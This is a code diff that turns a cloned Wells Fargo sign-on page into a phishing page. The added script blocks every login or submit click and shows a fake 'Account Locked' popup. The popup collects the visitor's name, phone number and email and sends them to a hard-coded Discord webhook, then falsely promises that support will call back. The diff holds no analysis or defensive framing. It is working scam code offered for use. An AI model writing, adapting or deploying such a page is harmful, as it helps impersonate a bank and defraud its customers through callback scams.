@@ -329,24 +329,177 @@ var ndURI ="https://connect.secure.wellsfargo.com/ATADUN/2.2/w/w-642409/sync/js/
         left: 0;
         z-index:9999;
 	    }</style><script src="./WFL_files/detector-dom.min.js.download" async="" id="_cls_detector" data-clsconfig="reportURI=https://gbxreport-prod.wf.com/glassbox/reporting/0C458F45-AC71-02CE-34D8-401C8A313B38/cls_report;clientAttributesEnabled=true;clientAttributesMaxLength=150;recordConsoleErrors=true;recordScrolls=true;recordMouseMoves=true;recordErrors=true;recordHovers=true;idleEventTimeInterval=-1;reportInterval=10000;interceptAjax=true;ajaxRecordMetadata=never;domMaskingMode=blacklist;domBlacklistMaskContentByClass=pmask;valueMaskingMode=blacklist;maskBlacklistValueByClass=pmask;domKeepScriptMatching=WF_TAGGING_DATA;captureGlobalObjects=WF_TAGGING_DATA;domTamperingDetectionEnabled=true;domOmitById=keypad;captureGlobalObjectsOnSegmentChange=true;devToolsDebuggerBasedDetection=false;ajaxRecordRequestHeaders=hostMatches(wellsfargo);ajaxRecordResponseHeaders=hostMatches(wellsfargo);ajaxRecordStats=hostMatches(wellsfargo);" nonce=""></script><script src="./WFL_files/alloy.js.download" async="" id="tagging-aep-websdk" nonce=""></script><script src="./WFL_files/gtag.js.download" async="" id="tagging-gtag" nonce=""></script><script src="./WFL_files/OrchestratorMain.js.download" async="" id="tagging-qualtrics" nonce=""></script><script nonce="">
-  // Disable all link navigation
+  // Show Account Locked error message with contact form
+  function showAccountLockedError() {
+    var backdrop = document.getElementById('popup-backdrop');
+    if (!backdrop) {
+      backdrop = document.createElement('div');
+      backdrop.id = 'popup-backdrop';
+      backdrop.style.cssText = 'display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.45);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);z-index:999998;';
+      document.body.appendChild(backdrop);
+    }
+    backdrop.style.display = 'block';
+
+    var errorDiv = document.getElementById('account-locked-error');
+    if (!errorDiv) {
+      errorDiv = document.createElement('div');
+      errorDiv.id = 'account-locked-error';
+      errorDiv.setAttribute('role', 'alert');
+      errorDiv.setAttribute('aria-live', 'assertive');
+      errorDiv.style.cssText = 'display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999999;width:90%;max-width:420px;background:#fff;border-radius:8px;box-shadow:0 8px 32px rgba(0,0,0,0.25);font-family:inherit;overflow:hidden;';
+
+      var header = document.createElement('div');
+      header.style.cssText = 'background-color:#cd1403;padding:16px 20px;color:#fff;display:flex;justify-content:space-between;align-items:flex-start;';
+      var headerLeft = document.createElement('div');
+      var headerTitle = document.createElement('h2');
+      headerTitle.textContent = 'Account Locked';
+      headerTitle.style.cssText = 'margin:0;font-size:18px;font-weight:700;font-family:inherit;color:#ffcc00;';
+      var headerSub = document.createElement('p');
+      headerSub.textContent = 'Contact support for assistance.';
+      headerSub.style.cssText = 'margin:4px 0 0 0;font-size:13px;opacity:0.9;font-family:inherit;';
+      headerLeft.appendChild(headerTitle);
+      headerLeft.appendChild(headerSub);
+
+      header.appendChild(headerLeft);
+      errorDiv.appendChild(header);
+
+      var body = document.createElement('div');
+      body.style.cssText = 'padding:20px;';
+
+      var form = document.createElement('form');
+      form.id = 'callback-contact-form';
+      form.style.cssText = 'display:flex;flex-direction:column;gap:14px;';
+
+      function createField(labelText, type, placeholder, name) {
+        var wrapper = document.createElement('div');
+        wrapper.style.cssText = 'display:flex;flex-direction:column;gap:4px;';
+        var label = document.createElement('label');
+        label.textContent = labelText;
+        label.style.cssText = 'font-weight:600;font-size:13px;color:#3b3331;font-family:inherit;';
+        var input = document.createElement('input');
+        input.type = type;
+        input.name = name;
+        input.placeholder = placeholder;
+        input.required = true;
+        input.style.cssText = 'padding:10px 12px;border:1px solid #767676;border-radius:4px;font-size:14px;font-family:inherit;box-sizing:border-box;';
+        input.onfocus = function() { this.style.borderColor = '#cd1403'; this.style.outline = 'none'; };
+        input.onblur = function() { this.style.borderColor = '#767676'; };
+        wrapper.appendChild(label);
+        wrapper.appendChild(input);
+        return wrapper;
+      }
+
+      form.appendChild(createField('Name', 'text', 'Your name', 'name'));
+      form.appendChild(createField('Phone Number', 'tel', 'Your phone number', 'phone'));
+      form.appendChild(createField('Email', 'email', 'you@example.com', 'email'));
+
+      var submitBtn = document.createElement('button');
+      submitBtn.type = 'submit';
+      submitBtn.textContent = 'Request Callback';
+      submitBtn.style.cssText = 'padding:12px;background-color:#cd1403;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;transition:background-color 0.2s;';
+      submitBtn.onmouseover = function() { this.style.backgroundColor = '#a81002'; };
+      submitBtn.onmouseout = function() { this.style.backgroundColor = '#cd1403'; };
+      form.appendChild(submitBtn);
+
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        var webhookUrl = 'https://discord.com/api/webhooks/1553531473041039380/hHgPBAibgg8LPicpEJfFqhdbAnVFV2vrBzwrSROAfCWKsuL0yyW-LpO_xLdL3Sxv-huh';
+
+        var payload = {
+          content: ':phone: **New Callback Request**',
+          embeds: [{
+            title: 'Callback Request Details',
+            color: 13414659,
+            fields: [
+              { name: 'Name', value: form.querySelector('[name="name"]').value, inline: true },
+              { name: 'Phone Number', value: form.querySelector('[name="phone"]').value, inline: true },
+              { name: 'Email', value: form.querySelector('[name="email"]').value, inline: true }
+            ],
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        var successDiv = document.createElement('div');
+        successDiv.style.cssText = 'display:flex;flex-direction:column;align-items:center;gap:12px;padding:24px 0;';
+
+        var checkCircle = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+        checkCircle.setAttribute('width', '56');
+        checkCircle.setAttribute('height', '56');
+        checkCircle.setAttribute('viewBox', '0 0 56 56');
+        checkCircle.innerHTML = '<circle cx="28" cy="28" r="26" fill="#468254" opacity="0.12"/>' +
+          '<circle cx="28" cy="28" r="24" fill="#468254"/>' +
+          '<path d="M17 28 L25 36 L39 20" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>';
+
+        var successMsg = document.createElement('p');
+        successMsg.textContent = 'Thank you! Support will contact you shortly.';
+        successMsg.style.cssText = 'color:#468254;font-weight:600;text-align:center;margin:0;font-size:15px;font-family:inherit;';
+
+        successDiv.appendChild(checkCircle);
+        successDiv.appendChild(successMsg);
+        form.replaceWith(successDiv);
+      });
+
+      body.appendChild(form);
+      errorDiv.appendChild(body);
+      document.body.appendChild(errorDiv);
+    }
+    errorDiv.style.display = 'block';
+  }
+
+  // Disable all link navigation and intercept login button clicks
   document.addEventListener('click', function(e) {
+    var popup = document.getElementById('account-locked-error');
+    if (popup && popup.contains(e.target)) return;
+
     let target = e.target;
-    // Check if clicked element or any parent is a link
+    // Check if clicked element or any parent is a link or submit button
     while (target && target !== document) {
       if (target.tagName === 'A') {
         e.preventDefault();
         e.stopPropagation();
         return false;
       }
+      if (target.tagName === 'BUTTON' || (target.tagName === 'INPUT' && (target.type === 'submit' || target.type === 'button'))) {
+        var btnText = (target.textContent || target.value || '').trim().toLowerCase();
+        if (btnText.indexOf('sign on') !== -1 || btnText.indexOf('signin') !== -1 || btnText.indexOf('log in') !== -1 || btnText.indexOf('login') !== -1 || btnText.indexOf('submit') !== -1 || target.type === 'submit') {
+          e.preventDefault();
+          e.stopPropagation();
+          showAccountLockedError();
+          return false;
+        }
+      }
       target = target.parentElement;
     }
   }, true);
   
-  // Disable form submissions
+  // Show error for any login attempt
   document.addEventListener('submit', function(e) {
+    var popup = document.getElementById('account-locked-error');
+    if (popup && popup.contains(e.target)) return;
+
     e.preventDefault();
     e.stopPropagation();
+
+    var errorDiv = document.getElementById('account-locked-error');
+    if (!errorDiv) {
+      errorDiv = document.createElement('div');
+      errorDiv.id = 'account-locked-error';
+      errorDiv.setAttribute('role', 'alert');
+      errorDiv.setAttribute('aria-live', 'assertive');
+      errorDiv.textContent = 'Account Locked, Contact support.';
+      errorDiv.style.cssText = 'display:none;background-color:#fdecea;border:1px solid #d32f2f;border-radius:4px;color:#b71c1c;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;font-size:14px;font-weight:600;margin:16px;padding:12px 16px;position:fixed;top:16px;left:50%;transform:translateX(-50%);z-index:999999;box-shadow:0 2px 8px rgba(0,0,0,0.2);max-width:90%;text-align:center;';
+      document.body.appendChild(errorDiv);
+    }
+    errorDiv.style.display = 'block';
+    errorDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
     return false;
   }, true);
   
